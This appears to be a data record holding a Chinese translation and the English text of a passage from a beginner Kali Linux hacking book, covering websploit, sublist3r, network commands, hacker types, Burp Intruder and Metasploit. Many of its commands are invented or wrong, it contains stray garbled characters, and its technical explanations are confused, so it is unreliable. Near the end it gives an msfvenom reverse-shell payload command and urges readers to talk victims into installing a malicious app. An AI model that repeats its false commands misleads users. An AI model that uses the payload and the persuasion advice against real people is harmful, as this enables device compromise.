  trans: '


    websploit 包含许多模块，例如无线模块和网络模块。需要记住，websploit 是与 Metasploit 配合使用的。Metasploit 是一个漏洞利用制作工具，可以帮助用户在各种文件中插入利用程序。我们将在最后一章详细学习这些
    Metasploit 的功能。


    现在我们来看发现隐藏目录的步骤。


    a) 在开始之前，你可以过滤掉错误选项，以排除一些最常见的错误，例如 `404` 错误（未找到文件）。

    b) 它已安装在 `Kali Linux` 中，可以在模块目录中找到。目录扫描模块（directory scanner module）是 `websploit`
    工具中最重要的模块之一，可用于查找目录及其语法形式。


    下面我们解释一下目录扫描模块中存在存在的一些命令，这些命令可以用于扫描隐藏目录：


    1) **Show（显示）** - 此命令将显示所有已存在的 Web 模块。当黑客处理大量利用程序时，往往会感到困惑并弄乱局面。正因如此，websploit
    包含了用于寻找漏洞目录的内置模块，而这个 `show` 命令可以帮助我们找到其中的一些。

    ```

    example@ linuxwar : show websploit www.exampleweb.com

    ```


    2) **Verbosity（详细程度）** - Verbosity 是一个简单的语句，允许我们设置 Linux shell 中显示的结果数量。当我们开始搜索隐藏目录时，通常会发现很多，这会让情况变得混乱。为了解决这个问题，我们可以使用
    `verbosity` 命令来显示自定义目录。还有一个选项可以让我们以静态的形式查看所有内容。


    3) **RUN（运行）** - 下一个重要的命令是 `RUN`，它帮助我们针对理想的网站运行利用程序。我们也可以使用这个网络传输系统。

    ```

    example@ linuxwar : run websploit www.exampleweb.com

    ```

    当你完美地执行这些命令时，网站有极大的概率被攻破。


    ### Cloud flare websploit


    我们甚至有第二组 websploit 命令可以用于处理云技术。Cloud flare 是网站最重要的安全层之一，目前正维护并保护多达 200 万个网站免受危险攻击。


    首先，要使用 cloud flare 模块，你需要在 websploit 模块列表列表中找到它，如下所示：

    ```

    example@ linuxwar : websploit select cloudfare www.exampleweb.com

    ```

    现在获取界面后，你可以在任何示例网站上安装 cloud flare，以检查它是否有效。Cloud fare 的工作原理是将系统的原始网络地址更改为其服务器之一。因此，如果发生任何注入攻击或暴力破解，它将立即停止或封锁该地址。Cloud
    fare 像是一个极低成本的网站入侵检测系统。


    #### 为什么 cloud flare 仍然容易被绕过？


    正如我们之前提到的，它只是用 IP 地址对攻击者进行欺骗。许多黑客开始收集数百个 Cloudflare 地址，并在每次攻击时放弃它们。某些技巧仍然可以使用，例如使用此
    cloud flare 扫描器来查找该网站托管的所有 IP 地址。


    在接下来的内容中，我们将学习 `uniscan`，这是最重要的 Web 指指纹识别工具之一。


    ### Uniscan


    `Uniscan` 通常用于漏洞扫描器的远程代码执行或远程文件插入。它还可以执行如 `ping`、`traceroute`、`software detection`
    等网络命令。


    以下是使用 `uniscan` 确定操作系统的命令：

    ```

    example@ linuxwar : uniscan select domain

    ```


    '
- fmt: "\nUniscan also provides a tool like `NMap` open port detection. It specifically\
    \ checks the os version of the server and scans the service. Uniscan also provides\
    \ a way to report the scanning reports using the export options as shown below\
    \ example:\n\n```bash\nexample@ linuxwar : uniscan export domain to domain\n```\n\
    \nWith this, we have completed a brief introduction to `uniscan` and would now\
    \ leave for the next section which will deal with the listing of subdirectories.\n\
    \n## Sublist3r\n\nWebsites consist of a lot of subdomains. Usually, domains that\
    \ are in the scope can be used easily to manipulate using applications like `burp\
    \ suite`. For suppose, `Gmail` has a lot of subdomains and if we can find access\
    \ to one of these, we can easily manipulate the whole website. This is the reason\
    \ why subdomain enumeration is one of the most important concepts hackers should\
    \ learn. We have a lot of tools that will help us find subdomains. In this section,\
    \ we will use a `sublist3r` to do the task. `sublist3r` is not present in the\
    \ Kali Linux tools list. For this reason, we need to install it from the git repository.\
    \ Below we explain how to install `sublist3r`. You can use this method to install\
    \ any third-party applications that are not available in the Kali Linux repository.\n\
    \n### Installing sublist3r\n\n1) Select the directory you need the tool should\
    \ be installed using the `cd` command.\n```bash\nexample@ linuxwar : cd install\
    \ sublist3r\n```\n\n2) `GitHub` is an online repository that makes things easy\
    \ for programmers when cloning the application. It is different from package managers\
    \ because one can actively contribute to the application using `git` console.\
    \ Here is the command that can be used to install `sublist3r`:\n```bash\ngit clone\
    \ (URL)\n```\n\n3) Now every git folder has a `requirements` file that will help\
    \ the system to install the other tools that are needed to be installed to make\
    \ the software work. These are called dependencies. Hackers should have a good\
    \ understanding of this because of many encounter errors. We will let you understand\
    \ dependencies with a perfect example. Imagine that you are trying to install\
    \ a java application like `Android studio`. If there is no `java` installed in\
    \ the system you cannot install and use the `Android studio`. That is what a dependency\
    \ stands for.\n\nIn the next section, we will explain the working of `sublist3r`.\
    \ Follow along to learn about it in detail.\n\n### Starting the sublist3r tool\n\
    \nRun the following command to start the subdomain searching tool.\n```bash\n\
    example@ linuxwar : run sublist3r\n```\n\nWe will get a lot of options that can\
    \ be chosen from this tool. We will even have a help section when entered `-h`\
    \ that explains the commands that can be used. Here are the functionalities that\
    \ this tool can perform in detail:\n\na) Domain `-d`: You can enter this parameter\
    \ to insert the domain you want to find subdomains for.\nb) Brute force: This\
    \ parameter can be used to start a brute force attack using a lot of domain lists\
    \ that are entered in a text file. This can be particularly used when you have\
    \ a lot of domains to test.\nc) Ports: Ports are the functionalities that can\
    \ be used for easy sub domain referencing. This parameter can help the user find\
    \ vulnerable subdomains using the open ports.\n\nApart from these basic parameters,\
    \ you can use output functionality to get the results into a text file from a\
    \ shell interface. We will now give some example commands that will let you understand\
    \ subdomain enumeration in detail:\n\n1) `python sublist3r.py -d [amazon.com]`:\
    \ This command will start an execution that will display all the subdomains that\
    \ are present after using the `d`.\n2) You can use this command to brute force\
    \ the first 100 domains that are present in the text file:\n```bash\npython sublist3r\
    \ text.txt\n```\n\nThrough these simple techniques, you can find subdomains. After\
    \ finding the subdomains list you can use techniques like a recon to further dig\
    \ a lot of information about them. While trying to hack a web application, hackers\
    \ should prefer this methodology to easily catch the easy way to get onto the\
    \ application. That's it we have completed a brief explanation about the available\
    \ web application tools and in the next section, we will start a detailed explanation\
    \ about network tools. Let's go!\n\n## Chapter 6: Network Hacking Tools \n\nThe\
    \ most important and complex to handle while hacking is dealing with networks.\
    \ Network in layman terms is just a system of interconnected networks. The Internet\
    \ is the biggest network that has changed lives. Companies and a lot of industries\
    \ run with interconnected networks. Whenever a hacker gets successful in entering\
    \ a network, he will try to hack the other subnetworks too. We will in this chapter\
    \ learn about a lot of network concepts and commands that will make hackers crack\
    \ the networks easily. Let us go!\n\n### What is a Network?\n\nA network is a\
    \ group of systems that are bound to work together or in a total sense used to\
    \ exchange information from each of them. For the appraisal of this definition,\
    \ we use a lot of technical devices that are used to exchange information. Some\
    \ of these devices are routers, modems, antennas, wires and even groups of satellites\
    \ that continuously track geographic variants for the working of GPS.\n\nKali\
    \ Linux consists of a lot of network tools that can be used to connect to an embedded\
    \ system or for being used as a server maintenance tool. We even have used the\
    \ network card configuration and wireless integration during the installation\
    \ of the operating system. In the next section, we will discuss `ifconfig` one\
    \ of the most important network tools that can be used to learn about the network\
    \ details that we are dealing with. All we need to do is to send packet signals\
    \ and we will learn about in detail.\n\n### ifconfig\n\n`ifconfig` is usually\
    \ the default command hackers use to know about the network information. It will\
    \ display a lot of information like Ethernet address, physical MAC address, IP\
    \ address, and even the network mask. There is also a section that describes the\
    \ number of packets that are released and received. Another line describes the\
    \ collisions of network packets. While some of them may be useless for hackers\
    \ they can be used to determine the network strength of the system they are trying\
    \ to exploit. Below is a command and output that shows about the `ifconfig` in\
    \ detail:\n\n```bash\nifconfig\n```\n\nHere are few things that `ifconfig` command\
    \ can do:\n\na) `ifconfig` can be used to specify the IP address with a netmask.\
    \ This command can be used when performing a wireless packet injection using the\
    \ network routers. Here is the command:\n```bash\nexample@ linuxwar : ifconfig\
    \ netmask 223.2.1.2\n```\nb) `ifconfig` on a whole can also be used to determine\
    \ the broadcast address that the system is on. It can be further manipulated with\
    \ the deviation of the netmask. Here is the command:\n```bash\nexample@ linuxwar\
    \ : ifconfig broadcast 212.11.1.1\n```\nc) `ifconfig` can be used to end the network\
    \ devices. Just like killing the processes sometimes it becomes necessary for\
    \ hackers to end the network drivers or devices they are connected to get rid\
    \ of sniffing or leaving any traces. Here is the command for switching off the\
    \ Ethernet driver:\n```bash\nexample@ linuxwar : ifconfig eth0 212.1.1.1\n```\n\
    \nIn this way, we can use `ifconfig` to switch on or off the network drivers.\
    \ However, `ifconfig` often only helps us to understand the information that is\
    \ already available and will not help us to manipulate any network information.\
    \ For this, we have to use advanced sniffing or clickjacking software's where\
    \ we can manipulate the configuration files and resources that are present. In\
    \ the next section, we will discuss some of these complex network manipulation\
    \ tasks in detail. Follow along!\n\n### Manipulating the network configuration\
    \ file\n\nUsually, when we run an `ifconfig` command everything that is acquired\
    \ or obtained by sending network packets is stored in a configuration file. Configuration\
    \ files are special types of files they maintain a certain order so that the system\
    \ can detect it. Not every file need not be a configuration file. However, when\
    \ we boot or switch off the system everything that is the input protocol information\
    \ will be deleted forever. So, instead of rekindling the entire procedure other\
    \ time it is best to write into a configuration file which can be easily found\
    \ in the, etc folder. In the configuration file enter the network address and\
    \ network mask in detail. It should be important because the manipulated network\
    \ configuration file can be used to do a fingerprinting about the system.\n\n\
    ### Routing and gateway settings\n\nA network card consists of a gateway and also\
    \ consists of a routing protocol that looks at how things are. Before starting\
    \ the network details, we will learn what a gateway is. Gateway is like an entrance\
    \ to the network system that we are dealing with. We usually have computers and\
    \ these are called hosts and they have an immediate address known as MAC address.\
    \ Gateway works as a checking point that checks the network packets and sends\
    \ them to the servers the user is trying to contact. It does the same when response\
    \ is received. For this reason, gateways are the most important part of network\
    \ systems.\n\n### Why are gateways important for hackers?\n\nWhen you are willing\
    \ to use a VPN or proxy server then you need to enter the gateway. Otherwise the\
    \ packets will just pass through the default gateway. Here are commands that can\
    \ be used to change the default gateway:\n```bash\nexample@ linuxwar : gateway\
    \ = 214.133.1.1\n```\n\n### What is Routing?\n\nRouting is a network protocol\
    \ that sends packets in a definite way so that the time that takes to transfer\
    \ the packets reduces. When a lot of packets are being sent it usually takes lot\
    \ of time and can result in less bandwidth. For this reason, efficient routing\
    \ protocols are being developed for better transportation of packets. For this,\
    \ we need to create routing table and should calculate for flags that may be present.\n\
    \n### Hosts\n\n1) `/etc/hosts`: In the early worlds of computing people used to\
    \ enter the IP address to send or receive any information from the system. But\
    \ after the successful introduction of the host no longer used. The host is just\
    \ a text interpretation of manual address. There is a file that is present in\
    \ `etc` folder where all DNS can be added. Nowadays this is usually made by google\
    \ server which consists of every web address. Also, hosts can be used to know\
    \ the number of packets transmitted.\n\n2) Search hosts: In this option, we can\
    \ use a command to search any name server that is present. When we use this tool,\
    \ we will get the input address of the website we are searching for. This will\
    \ help us find other important fingerprinting technologies. Below is the command\
    \ to find the hosts that are present:\n```bash\nexample@ linuxwar : search host\
    \ 23.1.2\n```\n\n3) Statistics: Statistics that are present can be used to display\
    \ the host information. Hosts are very important for successful connection to\
    \ the server. Apart from using it is a network tool are favorite of software.\
    \ Usually, when the software is reverse engineered and cracked by hackers it will\
    \ have ability to connect to the internet and redo everything. This is where hackers\
    \ make use of hosts files to redirect to `localhost` that will be regained.\n\n\
    4) Ping tool: Hackers often when trying to deal with networks after getting access\
    \ to the system will try to work on `ping`. This is because `ping` tool sends\
    \ a request to the tool and will let packets received. When you enter the command\
    \ in terminal the tool will start analyzing the packets and will display response.\
    \ For this reason, `ping` is often considered initiation of tools that need to\
    \ be mastered. Here is a command that explains working of `ping`:\n```bash\nping\
    \ www.hackkali.com\n```\nWhen we enter this command, the network will start analyzing\
    \ the packets that flowing and will give following output:\n```\n128 packets received\n\
    34 packets received\n32 packets received\n```\n\n5) Statistics: A `ping` is a\
    \ command tool that displays the content in the shell so there is no way you can\
    \ close the window. You can further check `ping` statistics using the following\
    \ command. With this command, all of the statistics that deals with domain will\
    \ be displayed. \n\n6) Traceroute: Networks are used to send information from\
    \ one system to another that is present elsewhere. However, have you ever wondered\
    \ how this information will passed on? The transportation of information is done\
    \ using packets and routers. Packets are basic traffic that exchanges the information.\
    \ Traceroute networks are ought to do. Check yourself about the packets that passing\
    \ through using `traceroute` command:\n```bash\nexample@ linuxwar : traceroute\
    \ 192.23.2.1\n```\n\n## Chapter 7: Web Hierarchies and Cybersecurity Ethics\n\n\
    In today’s world, it has become very difficult for people who are concerned about\
    \ their privacy and security. Hackers tend to work in different ways to exploit\
    \ systems by known vulnerabilities. A lot of information is available for some\
    \ of the most famous vulnerabilities like `XSS`, `SQL injections` and `CSRF` to\
    \ understand and exploit them using one's code. Often hackers use automatic vulnerability\
    \ scanners to find loops in the web application or a network system. However,\
    \ there are a lot of hierarchies that are divided based on the motives of the\
    \ attacker and their goals. In this chapter, we will help you understand all the\
    \ hierarchies that are present. This is a bit of theoretical subject so try to\
    \ think about them in your own words for easy understanding.\n\n### Why Do Hackers\
    \ Fit Into Hierarchies?\n\nOften people and security researchers face a lot of\
    \ people who are trying to attack corporate and personal systems. Many times,\
    \ white hat hackers who in common terms try to protect the systems decide the\
    \ danger of an attack with attacker steps and logfiles they left while trying\
    \ to exploit the system. With the help of this information, they tend to decide\
    \ the motivation behind the attack. For better forensic analysis security researchers\
    \ from long time are using hierarchies to organize the level of attack. Hierarchies\
    \ are important for better understanding and analysis of the attack that took\
    \ place. There are seven types of hierarchies as explained below. We will describe\
    \ each of them in detail in the next section.\n\n#### Hierarchy 1: Script kiddies\n\
    \nScript kiddies are usually the high number of users who call themselves hackers\
    \ but have very little technical and scripting knowledge. This hierarchy of hackers\
    \ are often not so talented and can never break into a system without a step by\
    \ step procedure or explanation that is often found in hacking websites and forums\
    \ or social networking groups like YouTube and Facebook. But they should not be\
    \ taken of less importance because there is a high chance of script kiddies exploiting\
    \ system if it consists of outdated technology that is viable to lot of vulnerabilities.\n\
    \n#### Hierarchy 2: A group of Novice hackers\n\nNovice here synonyms to quite\
    \ good. A lot of hackers spend their time in hacking or cracking forums trying\
    \ to exchange their knowledge and exploiting things together. This hierarchy of\
    \ hackers due it for fun. They often try to crack websites like `Netflix` and\
    \ try to sell it to them for cheap prices. These novice hackers use cracking tools\
    \ with brute force ability to constantly login with a bunch of usernames and passwords\
    \ they have collected using a `SQL injection` vulnerability. As we talked about\
    \ the process you might have understood that this group of hackers purely depends\
    \ on luck. They cannot exploit usernames or passwords that they don't find. For\
    \ this reason, people should use secure strong passwords that cannot be exploited\
    \ by this hierarchy of hackers.\n\n#### Hierarchy 3: Hacktivists\n\nHacktivists\
    \ are advanced hackers who use their knowledge and hacking skills to give sensitive\
    \ or shocking information to the world that is otherwise is not possible. This\
    \ is a famous group falls under this category. They try to give information about\
    \ the government or shocking emails that will make the population understand.\
    \ This hierarchy of hackers are rare and always with their sensitivity.\n\n####\
    \ Hierarchy 4: Black hat hackers\n\nBlack hat hackers are the evil group of hierarchies\
    \ and use their skills to exploit systems. They use a lot of social engineering\
    \ techniques to get onto the user to give sensitive information like `Trojans`\
    \ and `keyloggers` to the system. Black hat hackers are highly professional and\
    \ advanced hackers who are very difficult to get caught because they use proxies.\
    \ The worst thing is there are more than 5% of hackers who solely sell on the\
    \ dark web.\n\n#### Hierarchy 5: Criminal gangs\n\nCriminal gangs are a group\
    \ of black hat hackers who work in group. This makes things worse than before.\
    \ Criminal gangs use a lot of resources to smuggle narcotics and other stuff into\
    \ the dark web. Criminal gangs work so efficiently that it is even difficult to\
    \ catch.\n\n#### Hierarchy 6: State-sponsored hackers\n\nHackers are not ethical\
    \ people in general but are patriots most of the time. This is mainly for countries\
    \ like Russia and China hire a lot of professional hackers to hack into other\
    \ country where legal can be found.\n\n#### Hierarchy 7: Automated tools (Bots\
    \ that spread)\n\nAutomated tools don't consist of humans. There are a lot of\
    \ systems that cannot be accessed without humans. This is the hierarchy of automated\
    \ tools that are used to attack. These are like robots that can automate or think\
    \ itself the on the internet.\n\n## Chapter 9: Advanced Linux Hacking Tools\n\n\
    This chapter is a final implementation of all the concepts we learned. Kali Linux\
    \ Distro provides approximately 350 tools from various categories. We will use\
    \ some of the tools for web hacking, network hacking, and password cracking. Remember\
    \ that hacking tools are just an easy interface that let us work fastly and efficiently.\n\
    \n### Burp Suite\n\nBurp Suite is a tool that can be used by hackers to manipulate\
    \ pages. It is a proxy that acts like a middle man between the client and the\
    \ server. It allows us to see the requests and subsequent response. We will use\
    \ this tool to brute force the process to how Burp Suite works.\n\n### Intruder\n\
    \nIntruder in common words is an anonymous person that enters the house without\
    \ any permission or for theft. This is the exact way how an intruder works. When\
    \ we use this tool Burp Suite sends requests fastly and anonymously so that the\
    \ system won't detect it as malicious.\n\n#### Step by step procedure\n\n1) Now\
    \ enter some fake data in both username and password fields and send it through\
    \ the proxy server. With this procedure, all the data will be sent and the request\
    \ will be of `POST` category. The post is an HTML request category where the arguments\
    \ are sent along with the request.\n2) Now select all the post requests and send\
    \ them to the intruder tab. In the intruder tab, you can select the entered username\
    \ and password arguments using a dollar sign. After the arguments becoming highlighted\
    \ user can select the payload procedure type. There are a lot of procedures like\
    \ a single hammer, `cluster bomb`, and `pitch fork`.\n\na) single hammer: only\
    \ one argument is selected and is brute-forced using the payload.\nb) cluster\
    \ bomb: highlights two arguments that are sent.\nc) pitch fork: also highlights\
    \ two arguments but uses the payload in a way.\n\n### Payload\n\nThe payload is\
    \ a systematic collection of data or code that is executed by a target program.\
    \ It is one of the most important tools that is used to exploit. We will discuss\
    \ the types of payloads present in Burp Suite:\n\na) SQL injection payloads: Burp\
    \ Suite consists of SQL injection payloads that can easily crash the database.\n\
    b) XSS payloads: XSS is one of the most frequent web application vulnerabilities\
    \ easily found.\nc) custom payloads: With this option, we can create payloads\
    \ that random with alphabets.\nd) Runtime payloads: Usually, payloads are generated\
    \ but not used to be for execution.독e) recursive payloads: Recursion is a system\
    \ that sends the payloads in a loop.\n\n### Metasploit\n\nMetasploit is one of\
    \ the most important tools due to its huge number of features. It is available\
    \ as open-source. The major difference between both versions is that in the free\
    \ version you can only use two hosts at a time. Metasploit is pre-installed in\
    \ Kali Linux. To start Metasploit, use the following command:\n\n```bash\nmsfconsole\n\
    ```\n\n\n\na) -p: This needs to be used whenever you are trying to create an exploit\
    \ using Metasploit. Here our payload is `msfvenom`.\nb) LHOST: This is the argument\
    \ that describes our network address. We have already learned about finding the\
    \ IP address of our system using `ifconfig` tool.\nc) LPORT: Like the previous\
    \ one, this describes the port that we are willing to offer to Metasploit program.\n\
    d) R: This is where the apk format should be selected using the options. We are\
    \ dealing with raw information so this should be mentioned. owne) Location: This\
    \ argument helps us to select the apk we are referring to. You can simply give\
    \ the location so Metasploit can start making it as an exploit. To create a payload,\
    \ use the following command:\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp\
    \ LHOST=[IP] LPORT=[PORT] -f exe -o output.exe\n```\n\n### Why only android app\
    \ can be made?\n\nThis is a mandatory thing in iOS however android doesn't have\
    \ that restriction. But from the latest versions of android google made things\
    \ difficult for hackers. In the past with the help of remote execution hackers\
    \ used to install trojans and worms with malicious content with a click. However,\
    \ nowadays it has become a lot difficult because the user needs to grant the permissions\
    \ manually. For this reason, you need to even polish your social engineering skills\
    \ before trying to send the exploit to the victim. Make them believe with your\
    \ words that this is a necessary application that needs to be installed. That's\
    \ what all hackers do to manipulate things for their exploitation. We have a wide\
    \ variety of signing tools like `jar signer` in the Metasploit interface. Select\
    \ any one of them and use the following command:\n\n```bash\nroot @ examplelinux\
    \ : msfvenom signer -ssh 23.2.2.1\n```\n\na) Type of certificate: There are a\
    \ lot of certificate signs that need to be reviewed. You can use either an SHA\
    \ way or by RSA way. \nb) -verify: This command will make the tool to verify the\
    \ app with the certification that the user has selected. After verification, you\
    \ need to use aligning tools that can mix up the exploit that you have developed\
    \ with the apk tool.\nc) align: Aligning is a process of inserting the exploit\
